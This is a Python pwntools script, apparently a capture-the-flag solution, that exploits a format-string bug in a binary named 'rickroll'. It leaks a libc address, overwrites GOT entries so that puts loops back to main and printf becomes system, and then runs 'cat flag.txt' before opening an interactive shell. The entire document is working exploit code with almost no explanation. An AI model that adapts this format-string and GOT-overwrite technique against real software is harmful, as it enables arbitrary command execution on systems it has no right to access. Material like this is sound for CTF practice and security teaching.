#!/usr/bin/env python3

from pwn import *
import re

exe = ELF("./rickroll_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    # .bss:000000000040406C main_called
    # 6th and so on: controlled (stack) arguments

    payload  = b"-%39$lx-"      # Leaks LIBC address
    payload += fmtstr_payload(7, { exe.got["puts"]: exe.symbols["main"], exe.symbols["main_called"]: 0 }, numbwritten = 14)

    r.sendlineafter(b": ", payload)
    r.recvline()        # Remove garbage

    __libc_start_main = int(re.match(rb".*-(.+)-.*", r.recvuntil(b"Lyrics")).group(1), 16)
    libc.address = __libc_start_main - (libc.symbols["__libc_start_main"] + 234)
    log.info(f"LIBC Address: 0x{libc.address:x}")

    payload  = b"%21$n---"
    payload += fmtstr_payload(7, { exe.got["printf"]: libc.symbols["system"] }, numbwritten = 3)
    payload += p64(exe.symbols["main_called"])

    r.sendlineafter(b": ", payload)
    r.sendline(b"cat flag.txt")

    r.clean()
    r.interactive(b"$ ")


if __name__ == "__main__":
    main()
